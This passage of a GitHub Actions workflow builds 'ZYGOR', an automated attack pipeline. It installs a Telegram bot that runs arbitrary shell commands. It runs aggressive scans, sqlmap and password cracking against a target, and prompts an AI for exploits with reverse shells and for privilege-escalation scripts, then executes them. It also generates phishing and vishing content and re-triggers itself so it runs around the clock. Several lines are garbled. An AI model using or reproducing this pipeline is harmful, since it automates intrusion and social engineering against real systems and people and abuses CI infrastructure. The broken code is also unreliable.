      - name: '📱 Telegram Bot'
        if: env.TELEGRAM_ENABLE == 'true'
        shell: bash
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
        run: |
          if [ -z "$TELEGRAM_BOT_TOKEN" ]; then echo "⚠️ No token"; exit 0; fi
          cat > /opt/zygor/bin/telegram_controller.py << 'PYEOF'
#!/usr/bin/env python3
import asyncio, os, subprocess, logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN','')
CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID','')
TARGET = os.environ.get('TARGET','127.0.0.1')
ENABLE_EXFIL = os.environ.get('ENABLE_EXFIL','false')
logging.basicConfig(level=logging.INFO, filename='/var/log/zygor/telegram_bot.log')

async def run(cmd, timeout=60):
    try:
        p = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        o, e = await asyncio.wait_for(p.communicate(), timeout=timeout)
        return (o+e).decode(errors='replace')[:4000]
    except: return "Error"

async def start(u, c):
    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
    await u.message.reply_text(f"⚡ ZYGOR Online\n🎯 {TARGET}\n/help")

async def help_cmd(u, c):
    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
    await u.message.reply_text("/scan <target>\n/exploit <target>\n/ai <q>\n/exec <cmd>\n/status\n/abort")

async def scan(u, c):
    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
    t = ' '.join(c.args) or TARGET
    await u.message.reply_text(f"🔍 Scanning {t}...")
    r = await run(f"nmap -T4 -A -p- --script vuln {t} 2>/dev/null | tail -60", 300)
    await u.message.reply_text(f"```\n{r[:3000]}\n```")

async def do_exploit(u, c):
    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
    t = ' '.join(c.args) or TARGET
    await u.message.reply_text(f"💥 Exploiting {t}...")
    info = await run(f"nmap -sV {t} -p 22,80,443 2>/dev/null | head -20", 30)
    code = await run(f"echo 'Write Python exploit for {t}. Info: {info}' | /opt/zygor/bin/ai_complete 4096", 120)
    await u.message.reply_text(f"```\n{code[:2000]}\n```")

async def ai_q(u, c):
    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
    q = ' '.join(c.args)
    if not q: return
    a = await run(f"echo '{q}' | /opt/zygor/bin/ai_complete 4096", 120)
    await u.message.reply_text(f"*AI:* {a}")

async def do_exec(u, c):
    if ENABLE_EXFIL != 'true':
        await u.message.reply_text("⛔ /enableexfil first")
        return
    cmd = ' '.join(c.args)
    if not cmd: return
    r = await run(cmd, 120)
    await u.message.reply_text(f"```\n{r}\n```")

async def do_status(u, c):
    up = await run("uptime -p")
    mem = await run("free -h | grep Mem | awk '{print $4}'")
    await u.message.reply_text(f"Uptime: {up}\nMem: {mem}\nExfil: {ENABLE_EXFIL}")

async def do_abort(u, c):
    await u.message.reply_text("🛑 Aborting")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("scan", scan))
    app.add_handler(CommandHandler("exploit", do_exploit))
    app.add_handler(CommandHandler("ai", ai_q))
    app.add_handler(CommandHandler("exec", do_exec))
    app.add_handler(CommandHandler("status", do_status))
    app.add_handler(CommandHandler("abort", do_abort))
    app.run_polling()

if __name__ == '__main__':
    main()
PYEOF
          chmod +x /opt/zygor/bin/telegram_controller.py
          nohup python3 /opt/zygor/bin/telegram_controller.py > /var/log/zygor/telegram_bot.log 2>&1 &

      - name: '∞ Self-Re-Trigger (24/7)'
        shell: bash
        run: |
          MAX_SECONDS=$(( ${MAX_HOURS:-6} * 3600 ))
          SLEEP_TIME=$(( MAX_SECONDS - 1800 ))
          [ $SLEEP_TIME -lt 300 ] && SLEEP_TIME=300
          for attempt in 1 2 3; do
            (
              sleep $(( SLEEP_TIME + (attempt * 15) ))
              R=$(head -c 4 /dev/urandom | xxd -p)
              curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
                -H "Accept: application/vnd.github.v3+json" \
                -d "{\"ref\":\"main\",\"inputs\":{\"target\":\"${TARGET}\",\"penetration_phase\":\"${PHASE}\",\"run_duration_hours\":\"${MAX_HOURS}\"}}" \
                "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/${GITHUB_WORKFLOW}/dispatches" \
                --max-time 30 2>/dev/null
              curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
                -d "{\"event_type\":\"zygor-rebirth\",\"client_payload\":{\"id\":\"${R}\"}}" \
                "https://api.github.com/repos/${GITHUB_REPOSITORY}/dispatches" \
                --max-time 30 2>/dev/null
            ) &
          done
          wait

      - name: '💾 Multi-Layer Backup'
        shell: bash
        run: |
          TIMESTAMP=$(date -u +%Y%m%d_%H%M%S)
          mkdir -p /tmp/zygor_archive
          cp -r /opt/zygor/reports/* /tmp/zygor_archive/ 2>/dev/null || true
          cp -r /tmp/recon/*.txt /tmp/zygor_archive/ 2>/dev/null || true
          cp -r /tmp/exploit_output/*.txt /tmp/zygor_archive/ 2>/dev/null || true
          cd /tmp/zygor_archive
          git init 2>/dev/null
          git config user.email "backup@zygor.local"
          git config user.name "ZYGOR Backup"
          git add . 2>/dev/null
          git commit -m "Backup $TIMESTAMP" 2>/dev/null || true
          git push -f "https://x-access-token:${GITHUB_TOKEN_ABORT}@github.com/${GITHUB_REPOSITORY}.git" \
            HEAD:refs/heads/zygor-backup-$(date +%Y%m%d) 2>/dev/null || true
          curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
            -d "{\"body\":\"🔄 ZYGOR Backup ${TIMESTAMP}\"}" \
            "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/1/comments" 2>/dev/null || true
          echo "✅ Backup done"

      - name: '🔔 Startup Notify'
        shell: bash
        run: |
          [ -n "$DISCORD_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py discord "🚀 ZYGOR Started\n🎯 ${TARGET}\n🧠 ${AI_MODEL}\n🆔 ${GITHUB_RUN_ID}" "$DISCORD_WEBHOOK" 2>/dev/null || true
          [ -n "$SLACK_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py slack "🚀 ZYGOR Started\n🎯 ${TARGET}\n🧠 ${AI_MODEL}\n🆔 ${GITHUB_RUN_ID}" "$SLACK_WEBHOOK" 2>/dev/null || true

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # RECONNAISSANCE
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  reconnaissance:
    name: '🔍 Reconnaissance'
    needs: [bootstrap]
    runs-on: ubuntu-latest
    timeout-minutes: 360
    if: |
      github.event_name == 'schedule' ||
      inputs.penetration_phase == 'recon' ||
      inputs.penetration_phase == 'full'
    strategy:
      fail-fast: false
      matrix:
        module: [network_scan, web_discovery, ad_enum, osint_gather]
    steps:
      - uses: actions/checkout@v4
      - name: '🔧 Setup'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
          mkdir -p /tmp/recon

      - name: '📡 Network Scan'
        if: matrix.module == 'network_scan'
        shell: bash
        run: |
          nmap -T4 -A -p- --script vuln,exploit,discovery -oA /tmp/recon/nmap_full $TARGET 2>/dev/null || true
          masscan $TARGET --ports=1-65535 --rate=10000 -oX /tmp/recon/masscan.xml 2>/dev/null || true
          cat /tmp/recon/nmap_full.xml 2>/dev/null | ai_complete 2048 "Analyze Nmap. List ports, services, CVEs." > /tmp/recon/ai_analysis.txt 2>/dev/null || true

      - name: '🌐 Web Discovery'
        if: matrix.module == 'module == ''web_discovery'''
        shell: bash
        run: |
          subfinder -d $TARGET -o /tmp/recon/subdomains.txt 2>/dev/null || true
          whatweb $TARGET -a 3 --log-json=/tmp/recon/whatweb.json 2>/dev/null || true
          nuclei -u http://${TARGET} -severity critical,high,medium -o /tmp/recon/nuclei_web.txt 2>/dev/null || true

      - name: '🏢 AD/LDAP'
        if: matrix.module == 'ad_enum'
        shell: bash
        run: |
          ldapsearch -x -h $TARGET -p 389 -s base -b "" > /tmp/recon/ldap.txt 2>/dev/null || true
          smbclient -L //$TARGET -N > /tmp/recon/smb.txt 2>/dev/null || true

      - name: '🕵️ OSINT'
        if: matrix.module == 'osint_gather'
        shell: bash
        env:
          SHODAN_API_KEY: ${{ secrets.SHODAN_API_KEY }}
        run: |
          dig any $TARGET > /tmp/recon/dns.txt 2>/dev/null || true
          whois $TARGET > /tmp/recon/whois.txt 2>/dev/null || true
          curl -s "https://crt.sh/?q=%25.${TARGET}&output=json" > /tmp/recon/crt.json 2>/dev/null || true
          [ -n "$SHODAN_API_KEY" ] && shodan host $TARGET > /tmp/recon/shodan.txt 2>/dev/null || true

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: recon-${{ matrix.module }}-${{ github.run_id }}
          path: /tmp/recon/
          if-no-files-found: warn

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # EXPLOITATION
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  exploitation:
    name: '💥 Exploitation'
    needs: [bootstrap, reconnaissance]
    runs-on: ubuntu-latest
    timeout-minutes: 360
    if: |
      github.event_name == 'schedule' ||
      inputs.penetration_phase == 'exploitation' ||
      inputs.penetration_phase == 'full'
    strategy:
      max-parallel: 4
      fail-fast: false
      matrix:
        attack: [ai_exploit_gen, web_sqli_xss, password_cracking, privilege_escalation]
    steps:
      - uses: actions/checkout@v4
      - name: '🔧 Setup'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
          mkdir -p /tmp/exploit_output

      - name: '🧬 AI Exploit Gen'
        if: matrix.attack == 'ai_exploit_gen'
        shell: bash
        run: |
          INFO=""
          [ -f /tmp/recon/open_ports.txt ] && INFO=$(cat /tmp/recon/open_ports.txt 2>/dev/null)
          [ -f /tmp/recon/ai_analysis.txt ] && INFO="$INFO\n$(cat /tmp/recon/ai_analysis.txt 2>/dev/null)"
          CVEs=$(echo "$INFO" | grep -oP 'CVE-\d{4}-\d+' | sort -u)
          for CVE in $CVEs; do
            ai_complete 4096 <<< "Python exploit for $CVE targeting $TARGET with revshell to $LHOST:$LPORT. ONLY code." \
              > /tmp/exploit_output/exploit_${CVE}.py 2>/dev/null || true
            chmod +x /tmp/exploit_output/exploit_${CVE}.py 2>/dev/null
            if [ "${ENABLE_EXFIL}" = "true" ] && [ -s /tmp/exploit_output/exploit_${CVE}.py ]; then
              timeout 60 python3 /tmp/exploit_output/exploit_${CVE}.py > /tmp/exploit_output/${CVE}_result.txt 2>&1 || true
            fi
          done

      - name: '💉 SQLi + XSS'
        if: matrix.attack == 'web_sqli_xss'
        shell: bash
        run: |
          if [ -f /tmp/recon/ffuf.json ]; then
            jq -r '.results[] | select(.status == 200) | .url' /tmp/recon/ffuf.json 2>/dev/null | head -10 | while read url; do
              [[ "$url" == *"="* ]] && timeout 120 sqlmap -u "$url" --batch --risk=3 --level=5 --output-dir=/tmp/exploit_output/sqlmap 2>/dev/null || true
            done
          fi

      - name: '🔑 Password Cracking'
        if: matrix.attack == 'password_cracking'
        shell: bash
        run: |
          ai_complete 2048 <<< "Generate John rules: leet, year suffixes, special chars." > /tmp/exploit_output/rules.conf 2>/dev/null || true
          echo 'admin:$1$abc$1234567890abcdef1234567890abcde' > /tmp/exploit_output/hashes.txt
          [ -s /tmp/exploit_output/rules.conf ] && \
            john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/tmp/exploit_output/rules.conf \
              /tmp/exploit_output/hashes.txt > /tmp/exploit_output/john.txt 2>&1 || true

      - name: '⬆️ PrivEsc'
        if: matrix.attack == 'privilege_escalation'
        shell: bash
        run: |
          uname -a > /tmp/exploit_output/sys.txt
          find / -perm -4000 2>/dev/null | head -20 > /tmp/exploit_output/suid.txt
          ai_complete 8192 <<< "Linux privesc. System: $(cat /tmp/exploit_output/sys.txt /tmp/exploit_output/suid.txt 2>/dev/null). Identify vectors and commands." \
            > /tmp/exploit_output/privesc.sh 2>/dev/null || true
          [ "${ENABLE_EXFIL}" = "true" ] && bash /tmp/exploit_output/privesc.sh 2>/dev/null > /tmp/exploit_output/privesc_result.txt || true

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: exploits-${{ matrix.attack }}-${{ github.run_id }}
          path: /tmp/exploit_output/
          if-no-files-found: warn

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # WEB FORGE
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  web_forge:
    name: '🌐 Web Forge'
    needs: [bootstrap]
    runs-on: ubuntu-latest
    timeout-minutes: 360
    if: |
      github.event_name == 'schedule' || inputs.penetration_phase == 'web_forge' || inputs.penetration_phase == 'full'
    steps:
      - uses: actions/checkout@v4
        with:
          lfs: true
      - name: '🔧 Setup'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
          mkdir -p /tmp/web_forge_output

      - name: '🤖 AI Generates App'
        shell: bash
        run: |
          ai_complete 16384 <<< "Generate full-stack app: collaborative whiteboard with React/Vite/Tailwind, Node/Express/WebSocket, PostgreSQL. Each file with '# FILE: path'. Complete and runnable." \
            > /tmp/web_forge_output/generated.txt 2>/dev/null || true

          python3 << 'EOF'
import os, re
c = open('/tmp/web_forge_output/generated.txt').read()
r = '/tmp/web_forge_output/app'
os.makedirs(r, exist_ok=True)
cf, cl = None, []
for l in c.split('\n'):
    m = re.match(r'^#\s*FILE:\s*(.+)$', l)
    if m:
        if cf and cl:
            fp = os.path.join(r, cf)
            os.makedirs(os.path.dirname(fp), exist_ok=True)
            with open(fp, 'w') as f: f.write('\n'.join(cl))
        cf = m.group(1).strip()
        cl = []
    else:
        cl.append(l)
if cf and cl:
    fp = os.path.join(r, cf)
    os.makedirs(os.path.dirname(fp), exist_ok=True)
    with open(fp, 'w') as f: f.write('\n'.join(cl))
print("Done")
EOF

      - name: '🐳 Docker Build'
        shell: bash
        run: |
          cd /tmp/web_forge_output/app
          [ -f docker-compose.yml ] && timeout 300 docker-compose build 2>&1 || true

      - name: '📝 Commit & PR'
        shell: bash
        run: |
          cd /tmp/web_forge_output/app
          git init 2>/dev/null
          git checkout -b wf-$(date +%Y%m%d)
          git config user.email "zygor@pentest.ai"
          git config user.name "ZYGOR"
          git add .
          git commit -m "WebForge $(date -u)" 2>/dev/null || true
          git remote add origin "https://x-access-token:${GITHUB_TOKEN_ABORT}@github.com/${GITHUB_REPOSITORY}.git" 2>/dev/null || true
          git push -u origin $(git rev-parse --abbrev-ref HEAD) 2>/dev/null || true
          curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
            -d "{\"title\":\"🌐 ZYGOR WebForge\",\"head\":\"$(git rev-parse --abbrev-ref HEAD)\",\"base\":\"main\"}" \
            "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls" 2>/dev/null || true

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: webforge-${{ github.run_id }}
          path: /tmp/web_forge_output/app/
          if-no-files-found: warn

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # SOCIAL ENGINEERING
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  social_engineering:
    name: '👤 Social Engineering'
    needs: [bootstrap]
    runs-on: ubuntu-latest
    timeout-minutes: 120
    if: |
      (github.event_name == 'schedule' || inputs.enable_social_engineering == 'true') &&
      (github.event_name == 'schedule' || inputs.penetration_phase == 'full')
    steps:
      - name: '🔧 Setup'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
          mkdir -p /opt/zygor/reports/social_engineering

      - name: '📧 Generate Content'
        shell: bash
        run: |
          python3 /opt/zygor/bin/social_engineer.py email "User" "$TARGET" "security update" > /opt/zygor/reports/social_engineering/phishing.json 2>/dev/null || true
          python3 /opt/zygor/bin/social_engineer.py vishing "IT callback" "Help Desk" > /opt/zygor/reports/social_engineering/vishing.txt 2>/dev/null || true
          python3 /opt/zygor/bin/social_engineer.py pretext "$TARGET" "access" > /opt/zygor/reports/social_engineering/pretext.txt 2>/dev/null || true

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: social-engineering-${{ github.run_id }}
          path: /opt/zygor/reports/social_engineering/
          if-no-files-found: warn

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # CTF SOLVER
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  ctf_solver:
    name: '🏁 CTF Solver'
    needs: [bootstrap]
    runs-on: ubuntu-latest
    timeout-minutes: 120
    if: |
      (github.event_name == 'schedule' || inputs.ctf_mode == 'true') &&
      (github.event_name == 'schedule' || inputs.penetration_phase == 'full')
    steps:
      - name: '🔧 Setup'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
          mkdir -p /opt/zygor/reports/ctf

      - name: '🏁 Generate Guides'
        shell: bash
        run: |
          for t in web crypto reverse pwn forensics stego; do
            ai_complete 4096 <<< "CTF guide for $t challenges. 10 types, tools, commands." > /opt/zygor/reports/ctf/${t}_guide.md 2>/dev/null || true
          done

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: ctf-guides-${{ github.run_id }}
          path: /opt/zygor/reports/ctf/
          if-no-files-found: warn

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # DASHBOARD
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  dashboard_generator:
    name: '📊 Dashboard'
    needs: [bootstrap, reconnaissance, exploitation]
    runs-on: ubuntu-latest
    timeout-minutes: 60
    if: always()
    steps:
      - name: '🔧 Setup'
        shell: bash
        run: |
          mkdir -p /opt/zygor/reports/dashboard
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV

      - name: '📊 Generate'
        shell: bash
        run: |
          python3 /opt/zygor/bin/generate_dashboard.py "$TARGET" > /opt/zygor/reports/dashboard/index.html 2>/dev/null || true

      - name: '📤 Deploy to Pages'
        shell: bash
        run: |
          cp /opt/zygor/reports/dashboard/index.html /tmp/index.html
          cd /tmp
          git init
          git checkout -b gh-pages
          git config user.email "zygor@pentest.ai"
          git config user.name "ZYGOR"
          git add .
          git commit -m "Dashboard $(date -u)" 2>/dev/null || true
          git remote add origin "https://x-access-token:${GITHUB_TOKEN_ABORT}@github.com/${GITHUB_REPOSITORY}.git" 2>/dev/null || true
          git push -f origin gh-pages 2>/dev/null || true

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: dashboard-${{ github.run_id }}
          path: /opt/zygor/reports/dashboard/
          if-no-files-found: warn

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # EXECUTIVE REPORT
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  executive_report:
    name: '📊 Report'
    needs: [bootstrap, reconnaissance, exploitation, web_forge, dashboard_generator]
    runs-on: ubuntu-latest
    timeout-minutes: 120
    if: always()
    steps:
      - name: '🔧 Setup'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
          mkdir -p /opt/zygor/reports/final

      - name: '📊 AI Report'
        shell: bash
        run: |
          DATA=""
          for f in /tmp/recon/*.txt /tmp/recon/*.nmap /tmp/exploit_output/*.txt; do
            [ -f "$f" ] && DATA+="$(cat $f 2>/dev/null | head-2000)\n"
          done

          {
            echo "# ZYGOR v4.0 Executive Summary"
            echo "**Target:** ${TARGET}  "
            echo "**Run:** ${GITHUB_RUN_ID}  "
            echo "---"
            ai_complete 16384 <<< "Pentest executive report from data:\n${DATA:0:30000}\nInclude: summary, risk table, findings, remediation."
          } > /opt/zygor/reports/final/EXECUTIVE_SUMMARY.md 2>/dev/null

          echo "Complete" > /opt/zygor/reports/final/OPERATION_SUMMARY.txt

      - name: '📧 Email'
        shell: bash
        env:
          SENDGRID_API_KEY: ${{ secrets.SENDGRID_API_KEY }}
        run: |
          if [ -n "$REPORT_EMAIL" ] && [ -n "$SENDGRID_API_KEY" ]; then
            python3 -c "
import json, urllib.request
p = json.dumps({
    'personalizations':[{'to':[{'email':'$REPORT_EMAIL'}]}],
    'from':{'email':'zygor@pentest.local'},
    'Zygor':'subject':'ZYGOR Report',
    'content':[{'type':'text/plain','value':open('/opt/zygor/reports/final/EXECUTIVE_SUMMARY.md').read()[:15000]}]
})
urllib.request.urlopen(urllib.request.Request('https://api.sendgrid.com/v3/mail/send', data=p.encode(),
    headers={'Authorization':'Bearer $SENDGRID_API_KEY','Content-Type':'application/json'}), timeout=30)
" 2>/dev/null || true
          fi

      - name: '🔔 Notify Complete'
        shell: bash
        run: |
          MSG="✅ [ -n "$DISCORD_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py discord "✅ ZYGOR Complete\n🎯 ${TARGET}\n🆔 ${GITHUB_RUN_ID}" "$DISCORD_WEBHOOK" 2>/dev/null || true
          [ -n "$SLACK_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py slack "✅ ZYGOR Complete\n🎯 ${TARGET}\n🆔 ${GITHUB_RUN_ID}" "$SLACK_WEBHOOK" 2>/dev/null || true

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: ZYGOR-Report-${{ github.run_id }}
          path: /opt/zygor/reports/final/
          if-no-files-found: warn

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # CLEANUP
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  cleanup:
    name: '🧹 Cleanup'
    needs: [executive_report]
    runs-on: ubuntu-latest
    timeout-minutes: 60
    if: always()
    steps:
      - name: '📊 Final Summary'
        shell: bash
        run: |
          echo "══════════════════════════════════════"
          echo "  ZYGOR v4.0 COMPLETE"
          echo "══════════════════════════════════════"
          echo "  Target: ${TARGET}"
          echo "  Phase:  ${PHASE}"
          echo "  Exfil:  ${ENABLE_EXFIL}"
          echo "  Run:    ${GITHUB_RUN_ID}"
          echo "  Next:   ~${MAX_HOURS}h auto-trigger"
          echo "══════════════════════════════════════"
          {
            echo "ZYGOR v4.0 Summary"
            echo "Target: ${TARGET}"
            echo "Phase: ${PHASE}"
            echo "AI: ${AI_MODEL}"
            echo "Run: ${GITHUB_RUN_ID}"
          } > /opt/zygor/reports/final/OPERATION_SUMMARY.txt

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: ZYGOR-Summary-${{ github.run_id }}
          path: /opt/zygor/reports/final/OPERATION_SUMMARY.txt
          if-no-files-found: warn

# ═══════════════════════════════════════════════════════════════════════════════════════════════════
# REQUIRED SECRETS:
#   TELEGRAM_BOT_TOKEN    (for Telegram bot)
#   GROQ_API_KEY          (AI fallback)
#   GEMINI_API_KEY        (AI fallback)
#   SHODAN_API_KEY        (OSINT)
#   SENDGRID_API_KEY      (email reports)
#   AWS_ACCESS_KEY_ID     (S3 backup)
#   AWS_SECRET_ACCESS_KEY (S3 backup)
# ═══════════════════════════════════════════════════════════════════════════════════════════════════
